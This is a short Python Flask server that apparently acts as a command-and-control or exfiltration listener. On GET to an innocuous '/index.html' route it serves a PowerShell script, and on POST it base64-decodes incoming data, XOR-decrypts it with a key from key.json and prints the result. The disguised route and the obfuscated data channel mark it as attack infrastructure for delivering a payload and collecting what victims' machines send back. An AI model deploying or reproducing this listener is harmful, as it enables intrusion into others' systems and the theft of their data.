from flask import Flask, request, send_file
from json import loads
from base64 import b64decode


with open('key.json') as f:
    key = loads(f.read())


app = Flask(__name__)


@app.route("/index.html", methods=["GET", "POST"])
def root():
    if request.method == "GET":
        return send_file("../scripts/main.ps1")
    elif request.method == "POST":
        data = request.get_data()
        data = bytearray(b64decode(request.data))
        for i in range(len(data)):
            data[i] ^= key[i % len(key)]
        print(data.decode('utf-8'))
    return ""


if __name__ == '__main__':
    app.run(host="192.168.78.89", port=80)
